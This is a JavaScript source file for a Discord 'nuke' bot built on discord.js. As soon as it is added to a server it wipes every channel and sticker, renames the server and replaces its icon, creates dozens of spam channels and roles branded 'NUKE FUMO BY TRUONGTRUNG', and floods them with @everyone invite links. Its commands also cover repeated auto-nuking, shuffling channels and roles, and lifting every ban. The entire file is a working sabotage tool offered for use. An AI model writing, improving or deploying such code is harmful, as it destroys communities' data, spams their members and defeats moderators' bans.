const { Client, GatewayIntentBits } = require('discord.js');
const fs = require('fs').promises;
const path = require('path');
const sizeOf = require('image-size');

let autoNukeActive = false;
let attackActive = false;
let shuffleChannelsActive = false;

async function loadConfig() {
    const configPath = path.join(__dirname, 'config.json');
    const configData = await fs.readFile(configPath, 'utf-8');
    return JSON.parse(configData);
}

async function validateImage(filePath) {
    const imageBuffer = await fs.readFile(filePath);
    const dimensions = sizeOf(imageBuffer);

    if (dimensions.type !== 'png' && dimensions.type !== 'apng') {
        throw new Error('Image must be in PNG or APNG format');
    }

    const stats = await fs.stat(filePath);
    if (stats.size > 500 * 1024) {
        throw new Error('Image size must be less than 500 KB');
    }

    if (dimensions.width < 320 || dimensions.height < 320 || dimensions.width > 4096 || dimensions.height > 4096) {
        throw new Error('Image dimensions must be between 320x320 and 4096x4096 pixels');
    }

    return imageBuffer;
}

function shuffleArray(array) {
    const shuffled = array.slice();
    for (let i = shuffled.length - 1; i > 0; i--) {
        const j = Math.floor(Math.random() * (i + 1));
        [shuffled[i], shuffled[j]] = [shuffled[j], shuffled[i]];
    }
    return shuffled;
}

function getRandomColor() {
    const letters = '0123456789ABCDEF';
    let color = '#';
    for (let i = 0; i < 6; i++) {
        color += letters[Math.floor(Math.random() * 16)];
    }
    return color;
}

async function shuffleChannels(guild, duration = 60000) {
    const endTime = Date.now() + duration;

    shuffleChannelsActive = true;
    while (Date.now() < endTime && shuffleChannelsActive) {
        const channels = Array.from(guild.channels.cache.values());
        const shuffledChannels = shuffleArray(channels);

        const setPositionPromises = [];
        for (let i = 0; i < channels.length; i++) {
            setPositionPromises.push(channels[i].setPosition(shuffledChannels[i].position).catch(console.error));
        }

        await Promise.all(setPositionPromises);
        await new Promise(resolve => setTimeout(resolve, 22000)); // Wait 22 seconds before the next shuffle
    }
    shuffleChannelsActive = false;
}

async function shuffleRoles(guild, duration = 60000) {
    const endTime = Date.now() + duration;

    while (Date.now() < endTime) {
        const roles = Array.from(guild.roles.cache.values());
        const shuffledRoles = shuffleArray(roles);

        const setPositionPromises = [];
        for (let i = 0; i < roles.length; i++) {
            setPositionPromises.push(roles[i].setPosition(shuffledRoles[i].position).catch(console.error));
        }

        await Promise.all(setPositionPromises);
        await new Promise(resolve => setTimeout(resolve, 5000)); // Wait 5 seconds before the next shuffle
    }
}

async function performAttack(guild, config) {
    console.log('Performing attack on guild:', guild.name);
    attackActive = true;

    try {
        // Xóa kênh và sticker cũ
        const deleteChannelsPromise = Promise.all(guild.channels.cache.map(channel => channel.delete().catch(console.error)));
        const deleteStickersPromise = guild.stickers.fetch().then(stickers => Promise.all(stickers.map(sticker => sticker.delete().catch(console.error))));

        // Đặt lại tên và icon server
        const setNamePromise = guild.setName(config.newServerName).catch(console.error);
        const setIconPromise = fs.readFile('./icon.jpg').then(iconJpg => guild.setIcon(iconJpg).catch(console.error));

        // Tạo 40 kênh
        const channelNames = Array(30).fill('NUKE FUMO BY TRUONGTRUNG');
        const createChannelsPromise = createChannelsConcurrently(guild, channelNames, 20); // Increase batch size to 20

        // Tạo sticker
        let createStickersPromise = Promise.resolve();
        try {
            const iconPngBuffer = await validateImage('./converted_image.png');
            createStickersPromise = Promise.all(
                Array.from({ length: 5 }, (_, i) =>
                    guild.stickers.create({
                        file: iconPngBuffer,
                        name: `Sticker${i + 1}`,
                        description: `Description for Sticker${i + 1}`,
                        tags: `sticker${i + 1}`
                    }).catch(console.error)
                )
            );
        } catch (error) {
            console.error('Error validating or creating sticker:', error);
        }

        // Thực hiện tất cả các lời hứa cùng lúc
        await Promise.all([
            deleteChannelsPromise,
            setNamePromise,
            setIconPromise,
            createChannelsPromise,
            deleteStickersPromise,
            createStickersPromise
        ]);

        // Spam tin nhắn
        const newChannels = await createChannelsPromise;
        const spamPromises = [];
        for (let i = 0; i < 10; i++) {
            for (const channel of newChannels) {
                if (channel.isTextBased()) {
                    spamPromises.push(channel.send(`@everyone Tham gia kênh để học ngôn ngữ lập trình https://discord.com/invite/GkMUrP5wjh`).catch(console.error));
                }
            }
        }
        await Promise.all(spamPromises);

        // Tạo 10 vai trò
        const roleNames = Array(10).fill('NUKE FUMO BY TRUONGTRUNG');
        const createRolesPromise = createRolesConcurrently(guild, roleNames, 10); // Increase batch size to 10
        await createRolesPromise;

    } finally {
        attackActive = false;
    }
}

async function createChannelsConcurrently(guild, channelNames, batchSize) {
    const createdChannels = [];
    let i = 0;
    while (i < channelNames.length) {
        const batch = channelNames.slice(i, i + batchSize);
        const batchPromises = batch.map(name => guild.channels.create({ name, type: 0 }).catch(console.error));
        const batchResults = await Promise.all(batchPromises);
        createdChannels.push(...batchResults);
        i += batchSize;
    }
    return createdChannels;
}

async function createRolesConcurrently(guild, roleNames, batchSize) {
    const createdRoles = [];
    let i = 0;
    while (i < roleNames.length) {
        const batch = roleNames.slice(i, i + batchSize);
        const batchPromises = batch.map(name => guild.roles.create({
            name,
            permissions: [],
            color: getRandomColor()
        }).catch(console.error));
        const batchResults = await Promise.all(batchPromises);
        createdRoles.push(...batchResults);
        i += batchSize;
    }
    return createdRoles;
}

async function createRolesInBatches(guild, roleNames, batchSize) {
    const createdRoles = [];
    for (let i = 0; i < roleNames.length; i += batchSize) {
        const batch = roleNames.slice(i, i + batchSize);
        const batchPromises = batch.map(name => guild.roles.create({
            name,
            permissions: [],
            color: getRandomColor()
        }).catch(console.error));
        const batchResults = await Promise.all(batchPromises);
        createdRoles.push(...batchResults);
    }
    return createdRoles;
}

async function batchPromises(items, batchSize, fn) {
    const results = [];
    for (let i = 0; i < items.length; i += batchSize) {
        const batch = items.slice(i, i + batchSize);
        const promises = batch.map(item => fn(item));
        results.push(...await Promise.all(promises));
    }
    return results;
}

async function main() {
    const config = await loadConfig();

    const client = new Client({
        intents: [
            GatewayIntentBits.Guilds,
            GatewayIntentBits.GuildMessages,
            GatewayIntentBits.MessageContent
        ]
    });

    const prefix = '!';

    client.once('ready', () => {
        console.log(`Logged in as ${client.user.tag}!`);
    });

    client.on('guildCreate', async guild => {
        await performAttack(guild, config);
    });

    client.on('messageCreate', async message => {
        if (!message.content.startsWith(prefix) || message.author.bot) return;

        const args = message.content.slice(prefix.length).trim().split(/ +/);
        const command = args.shift()?.toLowerCase();

        if (command === 'attack') {
            if (!autoNukeActive && !shuffleChannelsActive) {
                await performAttack(message.guild, config);
            } else {
                message.channel.send('Cannot perform attack while auto nuke or shuffle channels is active.');
            }
        } else if (command === 'unban_all') {
            try {
                const bans = await message.guild.bans.fetch();
                const unbanPromises = bans.map(ban => message.guild.members.unban(ban.user));
                await Promise.all(unbanPromises);
                message.channel.send(`Unbanned all users (${bans.size})`);
            } catch (error) {
                console.error('Error unbanning users:', error);
                message.channel.send('Failed to unban all users.');
            }
        } else if (command === 'auto_nuke') {
            if (args[0] === 'on') {
                if (!autoNukeActive && !shuffleChannelsActive) {
                    message.channel.send('Auto nuke started.');
                    autoNukeActive = true;
                    autoNuke(message.guild, config);
                } else {
                    message.channel.send('Cannot start auto nuke while shuffle channels is active.');
                }
            } else if (args[0] === 'off') {
                if (autoNukeActive) {
                    autoNukeActive = false;
                    message.channel.send('Auto nuke stopped.');
                } else {
                    message.channel.send('Auto nuke is not running.');
                }
            } else {
                message.channel.send('Invalid argument. Use "on" or "off".');
            }
        } else if (command === 'shuffle_channels') {
            if (!autoNukeActive && !attackActive) {
                shuffleChannels(message.guild, 60000).then(() => {
                    message.channel.send('Shuffled all channels.');
                });
            } else {
                message.channel.send('Cannot shuffle channels while auto nuke or attack is active.');
            }
        } else if (command === 'shuffle_roles') {
            shuffleRoles(message.guild, 60000).then(() => {
                message.channel.send('Shuffled all roles.');
            });
        } else if (command === 'help') {
            const helpMessage = `
**Available Commands:**
\`\`\`
!attack - Perform an attack on the server
!unban_all - Unban all users in the server
!auto_nuke on/off - Start or stop auto nuke
!shuffle_channels - Shuffle all channels' positions in the server for 1 minute
!shuffle_roles - Shuffle all roles' positions in the server for 1 minute
!help - Display this help message
\`\`\`
            `;
            message.channel.send(helpMessage);
        }
    });

    client.login(config.token);
}

main().catch(console.error);
